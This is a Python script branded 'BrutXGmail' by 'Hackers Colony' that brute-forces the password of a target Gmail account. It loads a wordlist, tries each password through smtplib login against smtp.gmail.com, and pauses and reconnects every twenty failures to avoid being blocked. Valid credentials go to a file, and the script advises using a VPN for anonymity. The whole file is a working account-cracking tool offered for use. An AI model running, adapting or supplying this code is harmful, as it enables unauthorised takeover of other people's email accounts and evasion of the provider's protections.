#!/usr/bin/env python3
import os
import sys
import time
import smtplib
import socket

# Clear the terminal
os.system("clear")

# Animation function for smooth text display
def animate(text):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(0.008)

# SMTP setup function
def StartSMTPServiceForGmail():
    smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
    smtpserver.ehlo()
    smtpserver.starttls()
    return smtpserver

# Function to safely reconnect when connection is lost
def safe_reconnect(old_server, account, password, attempt_count):
    print("\n\033[1;33m[!] Connection lost. Reconnecting...\033[0m")
    try:
        old_server.close()
    except:
        pass
    time.sleep(5)  #短暂等待再重连
    new_server = StartSMTPServiceForGmail()
    # إعادة محاولة تسجيل الدخول بنفس كلمة المرور بعد إعادة الاتصال
    try:
        new_server.login(account, password)
        return new_server, True  # نجاح
    except Exception as e:
        return new_server, False # فشل

# Main brute force function (fixed)
def StartBruteAccount(Passlist, account, SMTPServer, sleep_time):
    # قراءة كل الكلمات في قائمة (لأنه أصلاً الهجوم على بريد واحد، الحجم مقبول للمدرسة)
    try:
        with open(Passlist, 'r') as f:
            passwords = [line.rstrip("\n") for line in f]
    except FileNotFoundError:
        print(f"\033[1;31mError: Password file '{Passlist}' not found. Exiting...\033[0m")
        exit()
    
    total = len(passwords)
    idx = 0
    fail_count = 0  # عداد المحاولات الفاشلة المتتالية لإعادة الاتصال
    server = SMTPServer

    while idx < total:
        password = passwords[idx]
        try:
            server.login(account, password)
            # إذا نجح تسجيل الدخول
            print(f"\n\033[1;32m[+] Valid Password Found: {password}, For: {account}\033[0m")
            with open('credits.txt', 'a') as DataFile:
                DataFile.write("\n--------------------------------------->")
                DataFile.write(f"[+] Email: {account}\n")
                DataFile.write(f"[+] Password: {password}\n")
                DataFile.write("--------------------------------------->\n")
            return True  # Exit the function

        except smtplib.SMTPAuthenticationError:
            # كلمة مرور خاطئة
            fail_count += 1
            print(f"\n\033[1;31m[-] Bad Password: {password}   \033[0m")
            idx += 1  # انتقل للكلمة التالية
            # كل 20 محاولة فاشلة، ننام لتجنب الحظر
            if fail_count % 20 == 0:
                print(f"\n\033[1;33m[!] Sleeping for {sleep_time} seconds...\033[0m")
                time.sleep(sleep_time)
                # نعيد الاتصال بعد النوم (للتأكد من أن الخادم لم يقطعنا)
                try:
                    server.quit()
                except:
                    pass
                server = StartSMTPServiceForGmail()
                print("\033[1;32m[+] Reconnected after sleep.\033[0m")
            continue

        except (smtplib.SMTPServerDisconnected, socket.error, ConnectionResetError, BrokenPipeError) as conn_err:
            # انقطع الاتصال فجأة - نعيد الاتصال ونحاول نفس كلمة المرور (دون زيادة idx)
            print(f"\n\033[1;33m[!] Connection error: {conn_err}. Reconnecting and retrying same password...\033[0m")
            try:
                server.quit()
            except:
                pass
            time.sleep(5)
            server = StartSMTPServiceForGmail()
            # لا نزيد idx، نعيد محاولة نفس كلمة المرور
            continue

        except Exception as e:
            # أي خطأ غير متوقع - نطبعه ونعيد المحاولة بعد إعادة الاتصال
            print(f"\n\033[1;31m[!] Unexpected error: {e}. Reconnecting...\033[0m")
            try:
                server.quit()
            except:
                pass
            time.sleep(10)
            server = StartSMTPServiceForGmail()
            # نعيد محاولة نفس كلمة المرور
            continue

    print("\n\033[1;31m[-] No valid password found in the wordlist.\033[0m")
    return False

# ASCII art for welcome screen
banner = '''\033[1;32m

                           ██╗  ██╗ ██████╗ ██████╗
                           ██║  ██║██╔════╝██╔═══██╗
                           ███████║██║     ██║   ██║
                           ██╔══██║██║     ██║   ██║
                           ██║  ██║╚██████╗╚██████╔╝
                           ╚═╝  ╚═╝ ╚═════╝ ╚═════╝

\033[1;33m

               
                   ██████╗ ██████╗ ██╗   ██╗████████╗██╗  ██╗
                   ██╔══██╗██╔══██╗██║   ██║╚══██╔══╝╚██╗██╔╝
                   ██████╔╝██████╔╝██║   ██║   ██║    ╚███╔╝ 
                   ██╔══██╗██╔══██╗██║   ██║   ██║    ██╔██╗ 
                   ██████╔╝██║  ██║╚██████╔╝   ██║   ██╔╝ ██╗
                   ╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚═╝  ╚═╝
                                          



\033[1;31m                     :: BrutXGmail - By Hackers Colony ::
\033[0m
'''
animate(banner)

# Disclaimer
notice = ("\n\033[1;34mThis Tool is Free For Our Subscribers.\n"
         "We are Redirecting You To Our YouTube Channel.\n"
         "Subscribe to our channel to use the tool.\033[0m\n")
animate(notice)
time.sleep(5)
os.system("xdg-open https://youtube.com/@hackers_colony_tech?si=7FEalwT2t0khmivd")
time.sleep(7)

# Clear terminal before showing program logo
os.system("clear")

logo = '''\033[1;32m

                 /$$$$$$$                        /$$     /$$   /$$
                | $$__  $$                      | $$    | $$  / $$
                | $$  \ $$  /$$$$$$  /$$   /$$ /$$$$$$  |  $$/ $$/
                | $$$$$$$  /$$__  $$| $$  | $$|_  $$_/   \  $$$$/ 
                | $$__  $$| $$  \__/| $$  | $$  | $$      >$$  $$ 
                | $$  \ $$| $$      | $$  | $$  | $$ /$$ /$$/\  $$
                | $$$$$$$/| $$      |  $$$$$$/  |  $$$$/| $$  \ $$
                |_______/ |__/       \______/    \___/  |__/  |__/                                                       


                    /$$$$$$                          /$$ /$$
                   /$$__  $$                        |__/| $$
                  | $$  \__/ /$$$$$$/$$$$   /$$$$$$  /$$| $$
                  | $$ /$$$$| $$_  $$_  $$ |____  $$| $$| $$
                  | $$|_  $$| $$ \ $$ \ $$  /$$$$$$$| $$| $$
                  | $$  \ $$| $$ | $$ | $$ /$$__  $$| $$| $$
                  |  $$$$$$/| $$ | $$ | $$|  $$$$$$$| $$| $$
                   \______/ |__/ |__/ |__/ \_______/|__/|__/
                             
                                                                            
          
            \033[1;34m     .:H a c k e r  C o l o n y  O f f i c i a l:.

                       __Gmail BruteForce Attack Tool__

'''
animate(logo)

# Instructions
dictr = "\033[1;32m\n[+] Ensure the wordlist is in the same directory as this script.\n"
vpnu = "[+] Use VPN for better anonymity.\n\033[0m\n\n"
animate(dictr)
animate(vpnu)

try:
    # SMTP Initialization
    smtpserver = StartSMTPServiceForGmail()

    # User inputs
    user = input("\033[1;36mEnter target Gmail ID: \033[0m")

    # Wordlist selection
    print("\033[1;36m\nChoose a wordlist:\033[0m")
    print("\n\033[1;31m1. Your Wordlist")
    print("\033[1;31m2. HCO Wordlist\033[0m")
    choice = input("\n\033[1;36mEnter your choice (1 or 2): \033[0m")

    if choice == "1":
        passwf_path = input("\n\033[1;36mEnter path to your custom wordlist: \033[0m")
    elif choice == "2":
        passwf_path = "hcowordlist.txt"
        print("\n\033[1;33mUsing HCO wordlist: 'hcowordlist.txt'\033[0m")
    else:
        print("\n\033[1;31mInvalid choice. Exiting...\033[0m")
        exit()

    # Start brute force attack with fixed function
    StartBruteAccount(passwf_path, user, smtpserver, 30)

except KeyboardInterrupt:
    print("\n\n\033[1;31m[!] Program interrupted by the user. \n\nExiting...\033[0m")
except Exception as smtp_error:
    print(f"\n\033[1;31mError: {smtp_error}\033[0m")